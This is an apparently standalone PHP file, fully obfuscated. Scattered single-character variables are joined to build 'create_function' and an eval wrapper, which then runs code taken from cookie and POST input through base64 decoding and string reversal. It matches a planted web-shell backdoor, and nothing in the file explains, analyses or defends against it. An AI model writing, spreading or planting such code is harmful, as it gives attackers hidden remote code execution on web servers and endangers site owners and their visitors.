<?php
$anstention='e';$kit= '$'; $grammars ='_e)nyMtTE';

$congress = 'tRNe(sE_a'; $chloette=')';$asserters ='l';$counterpointing = 'sE)O<';$keefer='[Oei*]';

$boyce ='G';$darbee='t'; $calculable = '"';
$light= 'aaKe-'; $azimuths = 'pyT';

$carolus= '$'; $cannibals='o';
$lukewarm= '(';

$caterpillars ='vs_delb:6';$gil ='RP5Us$a'; $dumbly = 'S9c)(3X;';
$casie = '_'; $conductors='e'; $chide ='s1H.rBr?';

$irons='$'; $gouging = 'am"'; $kidnap =']';$conveying ='ieee';
$leela ='efgrJr';$dorotea= '/';
$farces= 'u'; $lloyd = '"'; $gong= 'tei_WT:';$maam ='2';$beguiled='SR,)IlrEn';$enveloped = 'a("cEEn';$arranges= '4'; $curve= 'tiuO'; $linzy = 'TdKTr';

$devon ='7vVr'; $lumber = 'RA'; $grackle ='($i($R';$chaperon= ';QfFstL'; $chanting =';';

$hacking= 'gsM4rsai)'; $fixings ='('; $announces='m0';$chartroom='D o';$attended ='p)=+rv)s_'; $kingdoms =']'; $brice= ';$Lt'; $lobe= '")_o)(Q_)';

$epoch= 'Smg';

$lynnette = 'o'; $grade ='c';

$anorthic= 'P';$bawled='"'; $bonanza= ')';$linguistically='l';$interchanged='['; $forbear= 'r$_T]s6'; $buyers= 'e'; $competition= 'e';$begs = '(L'; $assured='i'; $create= 'L'; $house = '_C'; $erector ='('; $condensed= '?(L('; $homesteader = 'oVUv'; $auburn ='P"Mt'; $backwards='iS8:;dt'; $centripetal ='i_l>[,lI'; $bird = '"ea@r,';$dab='H';

$disdains='TS$CaiO?O';$intends = 'c';$alumni= '$=I';
$bluevelvet = 'r';$jury= '=Ra';$cobbler = '[';$letta='T';$intellectuals= 'aiHr';$devolution= 'I';$godly = $intends .$intellectuals['3'].

$bird[1].

$intellectuals['0'].$backwards[6] .$bird[1].$centripetal['1'].

$chaperon[2] .$curve['2'] .$enveloped['6'].
$intends . $backwards[6] . $intellectuals['1'] .
$homesteader[0] . $enveloped['6']; $humorous= $chartroom[1] ;

$boil =$godly($humorous,$bird[1] . $homesteader[3] .$intellectuals['0'] .
$centripetal['6'] .$condensed[3].$intellectuals['0'] . $intellectuals['3'] .
$intellectuals['3']. $intellectuals['0'] .$azimuths['1'].$centripetal['1']. $attended[0] . $homesteader[0]. $attended[0] .$condensed[3].$chaperon[2] .$curve['2']. $enveloped['6'].$intends.

$centripetal['1'] .$epoch['2'] . $bird[1] .
$backwards[6] .

$centripetal['1'].$intellectuals['0']. $intellectuals['3'] .$epoch['2'].
$forbear['5'] . $condensed[3] . $bonanza.

$bonanza.
$bonanza. $backwards[4] );

$boil ($leela['4'], $intellectuals['2'],
$caterpillars['6'] ,$maam ,$keefer['4'] , $cowpunch['2'], $devon[0], $homesteader['1'] , $enveloped['6'] ,
$alumni['0'] .$intellectuals['1'].$jury[0].$intellectuals['0'].$intellectuals['3'] . $intellectuals['3'] .

$intellectuals['0']. $azimuths['1'].$centripetal['1'] .
$epoch['1'] . $bird[1].$intellectuals['3'].

$epoch['2'] .$bird[1].

$condensed[3]. $alumni['0'] .
$centripetal['1'] .

$jury['1'] . $enveloped['5'].$lobe[6]. $homesteader['2'] .$enveloped['5']. $disdains['1'] . $letta .$bird['5']. $alumni['0'] . $centripetal['1'] .$disdains['3']. $disdains['8'] .$disdains['8'].$linzy['2'] . $devolution[0] . $enveloped['5'] . $bird['5'].

$alumni['0'] .$centripetal['1'].$disdains['1'].$enveloped['5'] .
$jury['1']. $homesteader['1']. $enveloped['5'] . $jury['1'] .$bonanza. $backwards[4] .

$alumni['0'].$intellectuals['0'].

$jury[0] . $intellectuals['1'] . $forbear['5'] .$forbear['5'] .

$bird[1].
$backwards[6]. $condensed[3] .$alumni['0'] .
$intellectuals['1'].$cobbler. $bird['0'].$intellectuals['3'].$centripetal['6'] . $centripetal['6'] .$epoch['1'] . $forbear['5']. $backwards[6].$homesteader[0] . $intellectuals['1'].$bird['0'] . $forbear['4']. $bonanza.$disdains[7] . $alumni['0'] .

$intellectuals['1'] .$cobbler.$bird['0'].

$intellectuals['3'] .

$centripetal['6']. $centripetal['6'].$epoch['1']. $forbear['5'] . $backwards[6].$homesteader[0]. $intellectuals['1'] .
$bird['0'] . $forbear['4'] .$backwards['3'] .$condensed[3] . $intellectuals['1'] .

$forbear['5']. $forbear['5'] . $bird[1] .$backwards[6] .

$condensed[3]. $alumni['0'] .

$intellectuals['1']. $cobbler .$bird['0'].$intellectuals['2'].$letta.

$letta.$auburn['0'] .$centripetal['1'].$jury['1'] . $condensed['2'] . $condensed['2'].$auburn['2'] .$disdains['1'] . $letta.$disdains['8'] . $devolution[0] .$bird['0']. $forbear['4'] .$bonanza . $disdains[7]. $alumni['0'] .
$intellectuals['1'].
$cobbler .$bird['0'].$intellectuals['2'] .$letta.$letta.$auburn['0'] .$centripetal['1'] . $jury['1'].$condensed['2'] . $condensed['2'].
$auburn['2'].$disdains['1'] . $letta .$disdains['8'] .

$devolution[0]. $bird['0'] . $forbear['4'].
$backwards['3']. $backwards['5'] .

$intellectuals['1'].$bird[1] . $bonanza.$backwards[4].
$bird[1].$homesteader[3]. $intellectuals['0'] .

$centripetal['6'] . $condensed[3]. $forbear['5'] .

$backwards[6] . $intellectuals['3'].$intellectuals['3'] .$bird[1].$homesteader[3].$condensed[3].

$caterpillars['6'].

$intellectuals['0'] .$forbear['5'].$bird[1].

$forbear['6'] . $hacking[3] . $centripetal['1'] .$backwards['5'].$bird[1]. $intends.

$homesteader[0] . $backwards['5'] . $bird[1].

$condensed[3]. $forbear['5']. $backwards[6] .

$intellectuals['3'].$intellectuals['3'] .$bird[1] .$homesteader[3] . $condensed[3].$alumni['0']. $intellectuals['0']. $bonanza .

$bonanza .
$bonanza . $bonanza .$backwards[4] ); 